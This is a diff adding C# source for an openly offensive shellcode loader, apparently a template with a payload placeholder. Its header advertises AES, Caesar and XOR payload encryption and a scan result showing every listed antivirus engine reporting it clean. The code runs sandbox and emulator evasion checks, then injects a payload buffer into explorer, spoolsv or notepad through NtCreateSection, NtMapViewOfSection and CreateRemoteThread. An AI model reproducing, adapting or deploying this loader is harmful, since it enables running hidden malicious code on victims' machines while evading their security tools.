@@ -1,0 +1,349 @@
+/*
+Uses AES encryption, caesar shift, and XOR encoding for payload encryption. Performs process Injection against specified group of processes.
+Scan Ref: https://antiscan.me/scan/new/result?id=6UGO2wHxTkqf
+Scan Date: 05-06-2021 03:48:06
+Result List:
+Ad-Aware Antivirus: Clean
+AhnLab V3 Internet Security: Clean
+Alyac Internet Security: Clean
+Avast: Clean
+AVG: Clean
+Avira: Clean
+BitDefender: Clean
+BullGuard: Clean
+ClamAV: Clean
+Comodo Antivirus: Clean
+DrWeb: Clean
+Emsisoft: Clean
+Eset NOD32: Clean
+Fortinet: Clean
+F-Secure: Clean
+IKARUS: Clean
+Kaspersky: Clean
+McAfee: Clean
+Malwarebytes: Clean
+Panda Antivirus: Clean
+Sophos: Clean
+Trend Micro Internet Security: Clean
+Webroot SecureAnywhere: Clean
+Windows 10 Defender: Clean
+Zone Alarm: Clean
+Zillya: Clean
+*/
+
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Diagnostics;
+using System.Security.Cryptography;
+using System.Threading.Tasks;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Net;
+
+namespace ProcessInjectionRunner
+{
+    public class SimpleAES
+    {
+        private AesCryptoServiceProvider _aes;
+        private ICryptoTransform _crypto;
+
+        public SimpleAES(string KEY, string IV)
+        {
+            _aes = new AesCryptoServiceProvider();
+            _aes.BlockSize = 128;
+            _aes.KeySize = 128;
+            _aes.Key = ASCIIEncoding.ASCII.GetBytes(KEY);
+            _aes.IV = ASCIIEncoding.ASCII.GetBytes(IV);
+            _aes.Padding = PaddingMode.PKCS7;
+            _aes.Mode = CipherMode.CBC;
+        }
+
+        public byte[] decrypt(string message)
+        {
+            _crypto = _aes.CreateDecryptor(_aes.Key, _aes.IV);
+            byte[] decrypted = _crypto.TransformFinalBlock(System.Convert.FromBase64String(message), 0, System.Convert.FromBase64String(message).Length);
+            _crypto.Dispose();
+            return decrypted;
+        }
+    }
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool IsWow64Process([In] IntPtr processHandle, [Out, MarshalAs(UnmanagedType.Bool)] out bool wow64Process);
+
+        public class WinApi
+        {
+            public const int TOKEN_DUPLICATE = 0x0002;
+            public const int TOKEN_QUERY = 0x00000008;
+            public const int SecurityImpersonation = 2;
+            public const int TokenImpersonation = 2;
+
+            [DllImport("advapi32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
+            [DllImport("advapi32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            public static extern bool DuplicateTokenEx(IntPtr hTok, UInt32 DesiredAccess, IntPtr SecAttPtr, int ImpLvl, int TokType, out IntPtr TokenHandle);
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
+
+            [DllImport("advapi32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            public static extern bool CreateWellKnownSid(WELL_KNOWN_SID_TYPE WellKnownSidType, IntPtr DomainSid, IntPtr pSid, ref uint cbSid);
+
+            [DllImport("advapi32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            public static extern bool CheckTokenMembership(IntPtr TokenHandle, IntPtr SidToCheck, out bool IsMember);
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern int GetCurrentProcessId();
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern int CloseHandle(IntPtr h);
+        }
+        public enum ProcessAccessFlags : uint
+        {
+            QueryInformation = 0x00000400,
+            QueryLimitedInformation = 0x1000
+        }
+
+        public enum WELL_KNOWN_SID_TYPE
+        {
+            WinBuiltinAdministratorsSid = 26
+        }
+
+        private static bool IsAdminGroupMember(int processId)
+        {
+            IntPtr hPriToken = IntPtr.Zero, hImpToken = IntPtr.Zero;
+            var hProcess = WinApi.OpenProcess(ProcessAccessFlags.QueryLimitedInformation, false, processId);
+            if (hProcess == IntPtr.Zero) hProcess = WinApi.OpenProcess(ProcessAccessFlags.QueryInformation, false, processId); // < Vista
+            var haveToken = WinApi.OpenProcessToken(hProcess, WinApi.TOKEN_DUPLICATE, out hPriToken);
+            if (haveToken)
+            {
+                haveToken = WinApi.DuplicateTokenEx(hPriToken, WinApi.TOKEN_QUERY, IntPtr.Zero, WinApi.SecurityImpersonation, WinApi.TokenImpersonation, out hImpToken);
+                WinApi.CloseHandle(hPriToken);
+            }
+            if (hProcess != IntPtr.Zero) WinApi.CloseHandle(hProcess);
+            if (haveToken)
+            {
+                uint cbSid = 0;
+                bool isMember = false;
+                WinApi.CreateWellKnownSid(WELL_KNOWN_SID_TYPE.WinBuiltinAdministratorsSid, IntPtr.Zero, IntPtr.Zero, ref cbSid);
+                IntPtr pSid = Marshal.AllocCoTaskMem(Convert.ToInt32(cbSid));
+                var succeed = pSid != IntPtr.Zero && WinApi.CreateWellKnownSid(WELL_KNOWN_SID_TYPE.WinBuiltinAdministratorsSid, IntPtr.Zero, pSid, ref cbSid);
+                succeed = succeed && WinApi.CheckTokenMembership(hImpToken, pSid, out isMember);
+                Marshal.FreeCoTaskMem(pSid);
+                WinApi.CloseHandle(hImpToken);
+                return succeed && isMember;
+            }
+            return false;
+        }
+
+        private static string GetProcessUser(Process process)
+        {
+            IntPtr processHandle = IntPtr.Zero;
+            try
+            {
+                OpenProcessToken(process.Handle, 8, out processHandle);
+                WindowsIdentity wi = new WindowsIdentity(processHandle);
+                string user = wi.Name;
+                return user.Contains(@"\") ? user.Substring(user.IndexOf(@"\") + 1) : user;
+            }
+            catch
+            {
+                return null;
+            }
+            finally
+            {
+                if (processHandle != IntPtr.Zero)
+                {
+                    CloseHandle(processHandle);
+                }
+            }
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SECT_DATA
+        {
+            public Boolean isvalid;
+            public IntPtr hSection;
+            public IntPtr pBase;
+        }
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
+
+        // Copied from Rubeus
+        [DllImport("ntdll.dll")]
+        public static extern UInt32 NtCreateSection(ref IntPtr section, UInt32 desiredAccess, IntPtr pAttrs, ref long MaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);
+
+        // Copied from Rubeus
+        [DllImport("ntdll.dll")]
+        public static extern UInt32 NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, IntPtr SectionOffset, ref long ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
+        static extern int NtClose(IntPtr hObject);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(UInt32 processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred); //Anti-AV emulator
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr FlsAlloc(IntPtr callback);
+
+        [DllImport("kernel32.dll")]
+        static extern uint GetTickCount();
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
+        public static void Main()
+        {
+            Console.WriteLine("[+] Validating Environment...");
+
+            DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (t2 < 1.5)
+            {
+                Environment.Exit(0);
+            }
+            Console.WriteLine("\t|_Date Time: " + t2);
+
+            IntPtr VirtualAllocExNumaMem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+
+            if (VirtualAllocExNumaMem == null)
+            {
+                Environment.Exit(0);
+            }
+            Console.WriteLine("\t|_VirtualAllocExNumaMem: " + VirtualAllocExNumaMem);
+
+            IntPtr FlsAllocMem = FlsAlloc(IntPtr.Zero);
+            if (FlsAllocMem == null)
+            {
+                Environment.Exit(0);
+            }
+            Console.WriteLine("\t|_FlsAlloc: " + FlsAlloc(IntPtr.Zero));
+
+            if (GetTickCount() < 60000)
+            {
+                Environment.Exit(0);
+            }
+            Console.WriteLine("\t|_GetTickCount: " + GetTickCount());
+
+            int manyrun = 0;
+            for (int z = 0; z < 100000000; z++)
+            {
+                manyrun++;
+            }
+            Console.WriteLine("\t|_LoopCheck: " + manyrun);
+            if (manyrun == 100000000)
+            {
+                Process currentProccess = Process.GetCurrentProcess();
+                if (currentProccess.WorkingSet <= 3500000)
+                {
+                    Environment.Exit(0);
+                }
+                else
+                {
+                    try
+                    {
+                        var fakeKey = new WebClient().DownloadString("http://ioashndoiasnddhaposdmawpidnaspidmwneionioasndoiasndpspodmadmasaadhjpoadelnbjkbnsa=asdasnmdpasjdpasdnfnpfnouahd/key.txt");
+                    }
+                    catch(Exception e)
+                    {
+                        {{{PayloadMethod}}}
+
+                        //https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf
+                        Process currentProcess = Process.GetCurrentProcess();
+                        Process[] localAll = Process.GetProcesses();
+
+                        List<string> userID = new List<string>(WindowsIdentity.GetCurrent().Name.Split(new string[] { "\\" }, StringSplitOptions.None));
+
+                        //Lists existing processes
+                        string[] SuggestedProcess = { "explorer", "spoolsv", "notepad" };
+                        foreach (Process p in localAll)
+                        {
+                            //Validates 64bit process.
+                            if (IsWow64Process(OpenProcess(0x001F0FFF, false, p.Id), out bool z) == true)
+                            {
+                                //Validates process is running under current user context.
+                                if (GetProcessUser(p) == userID[1])
+                                {
+                                    //validates if the process can be placed into MED or HIGH Integrity.
+                                    if (IsAdminGroupMember(WinApi.GetCurrentProcessId()) == IsAdminGroupMember(p.Id))
+                                    {
+                                        //Run injection code here...
+                                        if (SuggestedProcess.Contains(p.ProcessName))
+                                        {
+                                            IntPtr hSection = IntPtr.Zero;
+                                            string procName = p.ProcessName;
+                                            Process[] remoteProc = Process.GetProcessesByName(procName);
+                                            Process localProcess = Process.GetCurrentProcess();
+                                            IntPtr hOpenProcRemote = OpenProcess(0x001F0FFF, false, remoteProc[0].Id);
+                                            Console.WriteLine("\n[+] Attempting Migration to '" + procName + "'");
+                                            Console.WriteLine("\t|_Found PID:" + remoteProc[0].Id);
+                                            Console.WriteLine("\t|_Found Remote.Handle: " + hOpenProcRemote);
+                                            Console.WriteLine("\t|_Found Local.Handle: " + localProcess.Handle);
+
+                                            long size = buf.Length;
+                                            uint SectionHandle = NtCreateSection(ref hSection, 0x10000000, IntPtr.Zero, ref size, 0x40, 0x8000000, IntPtr.Zero);
+                                            Console.WriteLine("\n[+] NtCreateSection");
+                                            Console.WriteLine("\t|_Status Code: 0x" + Convert.ToString(SectionHandle, 16));
+
+                                            IntPtr remoteAddr = IntPtr.Zero;
+                                            uint NtRemoteView = NtMapViewOfSection(hSection, hOpenProcRemote, ref remoteAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref size, 1, 0, 0x40);
+                                            Console.WriteLine("\n[+] Remote NtMapViewOfSection");
+                                            Console.WriteLine("\t|_Status Code: 0x" + Convert.ToString(NtRemoteView, 16));
+                                            Console.WriteLine("\t|_remote.Addr: " + remoteAddr);
+
+                                            IntPtr outSize = IntPtr.Zero;
+                                            NtWriteVirtualMemory(hOpenProcRemote, remoteAddr, buf, buf.Length, out outSize);
+
+                                            DateTime t3 = DateTime.Now;
+                                            Sleep(2000);
+                                            double t4 = DateTime.Now.Subtract(t3).TotalSeconds;
+                                            if (t4 < 1.5)
+                                            {
+                                                //Windows Defender catches
+                                                Environment.Exit(0);
+                                            }
+
+                                            IntPtr hThread = CreateRemoteThread(hOpenProcRemote, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, IntPtr.Zero);
+                                            CloseHandle(hThread);
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
